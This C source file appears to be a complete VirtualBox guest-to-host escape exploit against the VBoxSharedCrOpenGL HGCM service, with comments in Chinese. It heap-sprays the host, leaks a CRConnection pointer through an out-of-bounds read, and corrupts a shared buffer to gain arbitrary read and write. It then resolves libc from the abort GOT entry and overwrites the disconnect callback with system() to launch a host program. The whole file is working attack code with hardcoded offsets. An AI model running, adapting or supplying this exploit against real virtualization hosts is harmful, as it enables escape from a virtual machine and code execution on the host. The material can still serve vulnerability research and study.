#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include "chromium.h"
#include "hgcm.h"

#define OFFSET_ALLOC_FUNC_PTR 0xC0
#define OFFSET_DISCONN_FUNC_PTR 0x118
#define OFFSET_PCRCONN 0x248
#define CRVBOXSVCBUFFER_SIZE 0x20
#define OFFSET_CONN_HOSTBUF 0x158
#define OFFSET_CONN_HOSTBUFSZ 0x164

typedef struct LeakClient {
   int new_client;
   uint64_t conn_addr;
} LeakClient;

typedef struct ArbWrite {
   uint32_t id;
   uint32_t size;
   uint64_t addr;
} ArbWrite;

LeakClient leak_client(int client) {
   //heap spray
   for (int i=0;i<1200;i++) {
      alloc_buf(client,0x238,"CRConnection_size_fill",23);
   }
   for (int i=0;i<1200;i++) {
      alloc_buf(client,0x9d0,"CRClient_size_fill",23);
   }

   uint32_t msg[] = {CR_MESSAGE_OPCODES, //type
                0x66666666, //conn_id
                1, //numOpcodes
                CR_EXTEND_OPCODE << 24,
                OFFSET_PCRCONN, //packet_length
                CR_GETUNIFORMLOCATION_EXTEND_OPCODE, //extend opcode
                0, //program
                *(uint32_t *)"leak" //name
                };
   int bufid = alloc_buf(client,0x238,msg,sizeof(msg));
   //CRClient和CRConnection结构体将被创建
   int new_client = hgcm_connect("VBoxSharedCrOpenGL");

   //通过bufid越界读，泄露下方的CRClient内容中的CRConnection
   crmsg_with_bufid(client,bufid);

   uint64_t conn_addr = *(uint64_t *)(crmsg_buf+0x10);
   LeakClient lc = {
   	.new_client = new_client,
        .conn_addr = conn_addr
   };
   return lc;
}

int stop() {
   char buf[0x10];
   write(1,"stop",0x5);
   read(0,buf,0x10);
}

int oob_buf;

int make_oob_buf(int client) {
   int buf_ids[0x4000];
   uint32_t msg[] = {CR_MESSAGE_OPCODES, //type
                0x66666666, //conn_id
                1, //numOpcodes
                CR_EXTEND_OPCODE << 24,
                0x12345678,
                CR_SHADERSOURCE_EXTEND_OPCODE, //extend opcode
                0, //shader
                2, //count
		0, //hasNonLocalLen
		0xfffff233,0x59, // *pLocalLength
		0x12345678 //padding
                };
   int buf1,gap,buf2;
   for (int i=0;i<0x4000;i++) {
       buf1 = alloc_buf(client,sizeof(msg),msg,sizeof(msg));
       gap = alloc_buf(client,sizeof(msg),"gggggggggggggggggggggggggggggggggggggggggggg",sizeof(msg));
       buf_ids[i] = alloc_buf(client,sizeof(msg),"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",sizeof(msg));
       alloc_buf(client,sizeof(msg),"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",sizeof(msg));
   }
   crmsg_with_bufid(client,buf1);
   //found couurpted buf's id
   for (int i=0x4000-1;i>=0;i--) {
      if (write_buf_test(client,buf_ids[i],sizeof(msg))) {
         buf2 = buf_ids[i];
         printf("found a corrupted buf at %d\n",i);
      }
   }
   //generate a new id
   char *buf2_id = (char *)&buf2;
   for (int i=0;i<4;i++) {
      if (buf2_id[i] == '\0') buf2_id[i] = '\n';
   }
   //now buf2 was corrupted
   oob_buf = buf2;
   return 0;
}

int arb_write(int client,uint64_t addr,uint32_t size,void *buf) {
   ArbWrite data = {
      .id = 0x66666666,
      .size = size,
      .addr = addr
   };
   //set CRVBOXSVCBUFFER_t's pData and size
   write_buf(client,oob_buf,0xa30,0x40,&data,sizeof(data));
   //arb write
   write_buf(client,0x66666666,size,0,buf,size);
   return 0;
}

int arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) {
   char val = 0x64;
   //防止disconnect时free pHostBuffer时崩溃，我们将disconnect函数指针指向附近的retn指令处
   arb_write(client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x1,&val);
   //设置pHostBuffer为目的地址
   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&addr);
   //设置size
   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&size);
   //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容
   return read_hostbuf(client,0x100,buf);
}

unsigned char buff[0x100] = {0};

int main() {
   int idClient = hgcm_connect("VBoxSharedCrOpenGL");
   printf("idClient=%d\n",idClient);
   set_version(idClient);
   //泄露出CRConnection的地址
   LeakClient leak = leak_client(idClient);

   int new_client = leak.new_client;
   set_version(new_client);
   uint64_t conn_addr = leak.conn_addr;
   printf("new_client=%d new_client's CRConnection addr=0x%lx\n",new_client,conn_addr);
   //制造OOB对象
   make_oob_buf(new_client);
   hgcm_disconnect(idClient);
   //读取函数指针，泄露地址
   arb_read(new_client,conn_addr,conn_addr + OFFSET_ALLOC_FUNC_PTR,8,buff);
   uint64_t alloc_addr = *((uint64_t *)buff);
   printf("alloc_addr=0x%lx\n",alloc_addr);
   uint64_t VBoxOGLhostcrutil_base = alloc_addr - 0x11a6a0;
   uint64_t abort_got = VBoxOGLhostcrutil_base + 0x375680;
   arb_read(new_client,conn_addr,abort_got,8,buff);
   uint64_t abort_addr = *((uint64_t *)buff);
   printf("abort_addr=0x%lx\n",abort_addr);
   uint64_t libc_base = abort_addr - 0x407e0;
   uint64_t system_addr = libc_base + 0x4f550;
   printf("libc_base=0x%lx\n",libc_base);
   printf("system_addr=0x%lx\n",system_addr);
   //修改disconnect函数指针为system地址
   arb_write(new_client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x8,&system_addr);
   char *cmd = "/usr/bin/galculator";
   arb_write(new_client,conn_addr,strlen(cmd)+1,cmd);
   //getshell
   hgcm_disconnect(new_client);
}
